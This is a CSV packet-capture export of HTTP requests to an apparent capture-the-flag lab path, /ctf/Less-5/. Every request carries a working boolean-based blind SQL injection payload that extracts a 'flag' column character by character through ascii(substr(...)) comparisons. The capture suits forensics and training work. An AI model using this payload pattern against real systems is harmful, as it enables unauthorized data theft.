"No.","Time","Source","Destination","Protocol","Length","Info"
"1148","1.633153556","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=58--+ HTTP/1.1 "
"1151","1.635183517","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1160","1.637344074","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=59--+ HTTP/1.1 "
"1163","1.639409205","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1172","1.641509652","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=60--+ HTTP/1.1 "
"1175","1.643646844","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1184","1.645987538","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=61--+ HTTP/1.1 "
"1187","1.648151997","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1196","1.650580544","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=62--+ HTTP/1.1 "
"1199","1.652582762","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1208","1.654758295","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=63--+ HTTP/1.1 "
"1211","1.656858688","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1220","1.659014491","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=64--+ HTTP/1.1 "
"1223","1.661006745","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1232","1.663157198","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=65--+ HTTP/1.1 "
"1235","1.665379267","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1244","1.667747945","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=66--+ HTTP/1.1 "
"1247","1.670126982","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1256","1.673256979","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=67--+ HTTP/1.1 "
"1259","1.675286416","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1268","1.678090173","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=68--+ HTTP/1.1 "
"1271","1.680438269","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1280","1.682514546","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=69--+ HTTP/1.1 "
"1283","1.684573183","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1292","1.687138539","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=70--+ HTTP/1.1 "
"1295","1.689109124","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1304","1.691585807","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=71--+ HTTP/1.1 "
"1307","1.693819020","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1316","1.696089507","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=72--+ HTTP/1.1 "
"1319","1.698204377","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1328","1.703587126","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=73--+ HTTP/1.1 "
"1331","1.705909976","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1340","1.708421653","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=74--+ HTTP/1.1 "
"1343","1.710812609","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1352","1.715050937","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=75--+ HTTP/1.1 "
"1355","1.717499533","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1364","1.720711555","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=76--+ HTTP/1.1 "
"1367","1.723232900","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1376","1.727841836","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=77--+ HTTP/1.1 "
"1379","1.730258530","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1388","1.733414350","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=78--+ HTTP/1.1 "
"1391","1.735878704","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1400","1.738383228","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=79--+ HTTP/1.1 "
"1403","1.740744212","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1412","1.743213165","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=80--+ HTTP/1.1 "
"1415","1.745354099","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1424","1.747767973","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=81--+ HTTP/1.1 "
"1427","1.749979801","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1436","1.752414002","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=82--+ HTTP/1.1 "
"1439","1.754616491","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1448","1.756924765","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=83--+ HTTP/1.1 "
"1451","1.759196761","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1460","1.761758370","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=84--+ HTTP/1.1 "
"1463","1.763977528","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1472","1.766583384","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=85--+ HTTP/1.1 "
"1475","1.768946265","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1484","1.771382491","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=86--+ HTTP/1.1 "
"1487","1.773645361","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1496","1.776743494","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=87--+ HTTP/1.1 "
"1499","1.778957678","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1508","1.781557721","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=88--+ HTTP/1.1 "
"1511","1.783976912","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1520","1.786487967","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=89--+ HTTP/1.1 "
"1523","1.788646225","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1532","1.791190288","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=90--+ HTTP/1.1 "
"1535","1.793250930","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1544","1.795707305","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=91--+ HTTP/1.1 "
"1547","1.798171162","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1556","1.800804557","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=92--+ HTTP/1.1 "
"1559","1.803064450","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1568","1.805376910","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=93--+ HTTP/1.1 "
"1571","1.807504391","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1580","1.809637594","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=94--+ HTTP/1.1 "
"1583","1.811704382","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1592","1.814322262","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=95--+ HTTP/1.1 "
"1595","1.816556299","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1604","1.819231457","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=96--+ HTTP/1.1 "
"1607","1.821449439","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1616","1.824199086","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=97--+ HTTP/1.1 "
"1619","1.826584035","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1628","1.828983446","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=98--+ HTTP/1.1 "
"1631","1.831131735","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1640","1.833723483","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=99--+ HTTP/1.1 "
"1643","1.835769489","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1652","1.838034506","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=100--+ HTTP/1.1 "
"1655","1.840220758","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1664","1.842417362","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=101--+ HTTP/1.1 "
"1667","1.844416056","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1676","1.846652789","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=102--+ HTTP/1.1 "
"1679","1.848722965","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1688","1.850861982","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=103--+ HTTP/1.1 "
"1691","1.852946936","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1700","1.855211681","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=104--+ HTTP/1.1 "
"1703","1.857227078","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1712","1.859769906","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=105--+ HTTP/1.1 "
"1715","1.861856346","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1724","1.864033614","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=106--+ HTTP/1.1 "
"1727","1.866094033","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1736","1.868368414","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=107--+ HTTP/1.1 "
"1739","1.870451852","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1748","1.872609447","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=108--+ HTTP/1.1 "
"1751","1.874668481","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"1760","1.877031568","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=33--+ HTTP/1.1 "
"1763","1.879252823","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1772","1.881590322","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=34--+ HTTP/1.1 "
"1775","1.883822001","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1784","1.886769105","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=35--+ HTTP/1.1 "
"1787","1.888557255","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1796","1.890935373","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=36--+ HTTP/1.1 "
"1799","1.892976723","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1808","1.895535085","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=37--+ HTTP/1.1 "
"1811","1.897660265","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1820","1.900234875","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=38--+ HTTP/1.1 "
"1823","1.902419381","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1832","1.905638009","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=39--+ HTTP/1.1 "
"1835","1.907896846","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1844","1.910256780","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=40--+ HTTP/1.1 "
"1847","1.912537283","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1856","1.914839656","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=41--+ HTTP/1.1 "
"1859","1.917100627","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1868","1.919550474","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=42--+ HTTP/1.1 "
"1871","1.921543535","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1880","1.923969655","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=43--+ HTTP/1.1 "
"1883","1.926219643","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1892","1.929212418","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=44--+ HTTP/1.1 "
"1895","1.931274819","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1904","1.933592552","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=45--+ HTTP/1.1 "
"1907","1.935946471","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1916","1.938179811","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=46--+ HTTP/1.1 "
"1919","1.940283564","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1928","1.942501779","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=47--+ HTTP/1.1 "
"1931","1.944567683","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1940","1.946710460","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=48--+ HTTP/1.1 "
"1943","1.948754950","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1952","1.950906976","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=49--+ HTTP/1.1 "
"1955","1.953104450","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1964","1.955307157","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=50--+ HTTP/1.1 "
"1967","1.957410909","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1976","1.959557391","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=51--+ HTTP/1.1 "
"1979","1.961648247","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1988","1.964124529","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=52--+ HTTP/1.1 "
"1991","1.966119608","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2000","1.968508191","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=53--+ HTTP/1.1 "
"2003","1.970592575","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2012","1.972911125","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=54--+ HTTP/1.1 "
"2015","1.975184209","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2024","1.977617595","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=55--+ HTTP/1.1 "
"2027","1.979587471","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2036","1.981932107","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=56--+ HTTP/1.1 "
"2039","1.984091434","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2048","1.986713476","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=57--+ HTTP/1.1 "
"2051","1.988938251","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2060","1.991190938","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=58--+ HTTP/1.1 "
"2063","1.993237144","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2072","1.995346169","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=59--+ HTTP/1.1 "
"2075","1.997394460","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2084","1.999821837","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=60--+ HTTP/1.1 "
